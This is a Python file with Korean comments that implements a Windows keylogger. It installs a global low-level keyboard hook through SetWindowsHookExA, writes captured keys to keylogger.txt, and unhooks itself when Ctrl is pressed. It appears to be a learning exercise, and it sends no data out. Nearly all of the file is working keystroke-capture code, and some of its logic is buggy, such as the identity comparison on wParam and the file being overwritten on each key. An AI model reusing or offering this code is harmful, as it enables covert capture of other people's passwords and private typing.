import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

# windll을 사용해서 user32와 kernel32 형 변수를 선언한다.
user32 = windll.user32
kernel32 = windll.kernel32

#Win32 API내부 변수를 미리 선언한다. 함수인자는 MSDN참고했다.
WH_KEYBOARD_LL = 13 #Installs a hook procedure that monitors low-level keyboard input events. For more information, see the LowLevelKeyboardProc hook procedure.
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

#훅 설정 함수 1.후킹할 메시지의 종류 2. 훅 프로시저 3. 후킹할 스레드의 DLL핸들 4.스레드 아이디
    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0 #전역 훅 설정할려고 0
        )
        if not self.hooked:
            return False
        return True

# user32.dll의 언훅 함수를 사용해서 훅해제한다, 안하면 시스템에 부하를 너무 많이줌
    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

#훅 프로시저를 등록하기위해 함수의 포인터를 전달해야함 CFUNCTYPE함수를 사용해 셋윈도우 훅 함수에서 요구하는 훅 프로시저의 인자와 자료형을 지정
def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))#타입지정
    return CMPFUNC(fn) #이게 훅프로시저 전달함수

#훅 프로시저는 이벤트 발생했을 때 사용자 단에서 처리하는 콜백함수.
#메시지종류가 WM_KEYDOWN이면 해당 메시지값을 화면에 프린트, 메시지값이 CTRL 키의 값과 일치하면 훅을 제거한다
#처리가 끝나면 훅 체인에 있는 다른 훅 프로시저에게 제어권을 넘김 (CallNextHookEx()함수)
def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    op = open('keylogger.txt', 'w')
    op.write(hookedKey)
    op.close()

    if(CTRL_CODE == int(lParam[0])):
        print ("컨트롤 눌렀음, 언훅 할꼐욤")
        KeyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg),0,0,0)

KeyLogger = KeyLogger()
pointer = getFPTR(hookProc)

if KeyLogger.installHookProc(pointer):
    print("키로거 인스톨")
startKeyLog()




